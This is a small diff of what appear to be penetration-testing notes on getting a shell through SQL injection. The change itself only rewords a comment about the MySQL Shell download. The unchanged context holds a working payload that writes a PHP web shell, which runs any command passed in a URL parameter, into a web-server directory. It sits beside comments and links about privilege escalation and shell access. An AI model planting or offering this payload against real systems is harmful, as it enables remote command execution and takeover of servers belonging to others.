@@ -20,7 +20,7 @@ SELECT '<?php exec($_GET[''cmd'']); ?>' FROM mytable INTO dumpfile ‘/var/www/h
 #More tricks to priv esc or get shell.
 https://security.stackexchange.com/questions/6919/leveraging-a-shell-from-sql-injection
 
-#If you dont have mysql client can use this -> really nice shell interactive.
+#If you dont have mysql client can use this -> really nice shell interactive just extract with tar.
 https://dev.mysql.com/downloads/shell/
 ```
 
